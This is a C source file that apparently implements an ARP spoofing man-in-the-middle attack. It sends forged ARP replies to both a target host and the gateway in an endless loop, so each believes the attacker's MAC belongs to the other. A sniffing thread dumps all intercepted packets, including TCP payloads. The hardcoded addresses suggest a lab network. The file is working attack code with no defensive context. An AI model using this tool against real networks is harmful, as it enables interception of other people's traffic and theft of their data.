#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>   
#include <sys/ioctl.h>        
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>

#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28

struct eth_hdr {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short ethertype;
};

struct arp_hdr {
    unsigned short hw_type;   
    unsigned short proto_type;
    unsigned char hw_size;    
    unsigned char proto_size;
    unsigned short opcode; 
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

void print_hex_ascii(const unsigned char *data, int len) {
    int i, j;
    for(i = 0; i < len; i++) {
        if (i != 0 && i % 16 == 0) {
            printf("  ");
            for(j = i - 16; j < i; j++) {
                if (data[j] >= 32 && data[j] <= 128)
                    printf("%c", data[j]);
                else
                    printf(".");
            }
            printf("\n");
        }
        if (i % 16 == 0) printf("  ");
        printf("%02x ", data[i]);
    }
    
    if (len % 16 != 0) {
        int spaces = (16 - (len % 16)) * 3;
        printf("%*s", spaces, "");
        for(j = (len - (len % 16)); j < len; j++) {
            if (data[j] >= 32 && data[j] <= 128)
                printf("%c", data[j]);
            else
                printf(".");
        }
    }
    printf("\n");
}

void print_packet(unsigned char *buffer, int size) {
    struct eth_hdr *eth = (struct eth_hdr *)buffer;
    struct iphdr *iph = (struct iphdr*)(buffer + ETH_HDR_LEN);
    
    printf("\n\n=== Ethernet Header ===\n");
    printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           eth->src_mac[0], eth->src_mac[1], eth->src_mac[2],
           eth->src_mac[3], eth->src_mac[4], eth->src_mac[5]);
    printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           eth->dest_mac[0], eth->dest_mac[1], eth->dest_mac[2],
           eth->dest_mac[3], eth->dest_mac[4], eth->dest_mac[5]);
    
    // Print IP Header
    printf("\n=== IP Header ===\n");
    printf("IP Version: %d\n", (iph->version));
    printf("IP Header Length: %d Bytes\n", ((iph->ihl) * 4));
    printf("Type of Service: %d\n", (iph->tos));
    printf("Total Length: %d Bytes\n", ntohs(iph->tot_len));
    printf("TTL: %d\n", (iph->ttl));
    printf("Protocol: %d\n", (iph->protocol));
    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
    printf("Dest IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));

    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(buffer + ETH_HDR_LEN + iph->ihl * 4);
        
        printf("\n=== TCP Header ===\n");
        printf("Source Port: %d\n", ntohs(tcph->source));
        printf("Dest Port: %d\n", ntohs(tcph->dest));
        printf("Sequence Number: %u\n", ntohl(tcph->seq));
        printf("Acknowledge Number: %u\n", ntohl(tcph->ack_seq));
        printf("Header Length: %d Bytes\n", (tcph->doff * 4));
        printf("Flags:\n");
        printf("  URG: %d, ACK: %d, PSH: %d\n", tcph->urg, tcph->ack, tcph->psh);
        printf("  RST: %d, SYN: %d, FIN: %d\n", tcph->rst, tcph->syn, tcph->fin);
        
        unsigned char *payload = buffer + ETH_HDR_LEN + (iph->ihl * 4) + (tcph->doff * 4);
        int payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - (tcph->doff * 4);
        
        if (payload_len > 0) {
            printf("\n=== Payload Data ===\n");
            print_hex_ascii(payload, payload_len);
        }
    }
    printf("\n==============================================\n");
}

void* sniff_packets(void *arg) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    unsigned char buffer[65536];

    while (1) {
        int data_size = recvfrom(sockfd, buffer, 65536, 0, NULL, NULL);
        if (data_size > 0) {
            print_packet(buffer, data_size);
        }
    }
    return NULL;
}

void send_arp_reply(const char *iface, const char *target_ip, const char *gateway_ip, const char *your_mac, const char *target_mac) {
    int sockfd;
    unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
    struct eth_hdr *eth = (struct eth_hdr *)buffer;
    struct arp_hdr *arp = (struct arp_hdr *)(buffer + ETH_HDR_LEN);
    struct sockaddr_ll socket_address = {0};
    struct ifreq ifr;

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("IOCTL failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    socket_address.sll_ifindex = ifr.ifr_ifindex;

    memcpy(eth->dest_mac, ether_aton(target_mac), 6); 
    memcpy(eth->src_mac, ether_aton(your_mac), 6);  
    eth->ethertype = htons(0x0806);                 


    arp->hw_type = htons(1);             
    arp->proto_type = htons(0x0800);      
    arp->hw_size = 6;                  
    arp->proto_size = 4;               
    arp->opcode = htons(2);          
    memcpy(arp->sender_mac, ether_aton(your_mac), 6); 
    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
    memcpy(arp->target_mac, ether_aton(target_mac), 6); 
    inet_pton(AF_INET, target_ip, arp->target_ip);  


    memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
    socket_address.sll_halen = ETH_ALEN;

    if (sendto(sockfd, buffer, ETH_HDR_LEN + ARP_PKT_LEN, 0,
               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        perror("Failed to send packet");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("ARP reply sent to %s (%s), spoofing as gateway (%s)\n", target_ip, target_mac, gateway_ip);

    close(sockfd);
}

int main() {
    const char *iface = "enp0s3";                
    const char *target_ip = "10.14.1.1";        
    const char *gateway_ip = "10.14.1.2";       
    const char *your_mac = "08:00:27:ad:ee:45";    
    const char *target_mac = "00:be:43:9b:c9:99"; 
    const char *gateway_mac = "00:be:43:9b:69:f2"; 

    pthread_t sniff_thread;
    pthread_create(&sniff_thread, NULL, sniff_packets, NULL);

    printf("Starting bidirectional ARP poisoning...\n");
    
    while (1) {
       
        send_arp_reply(iface, target_ip, gateway_ip, your_mac, target_mac);
        
      
        send_arp_reply(iface, gateway_ip, target_ip, your_mac, gateway_mac);
        
        sleep(3); 
    }

    return 0;
}
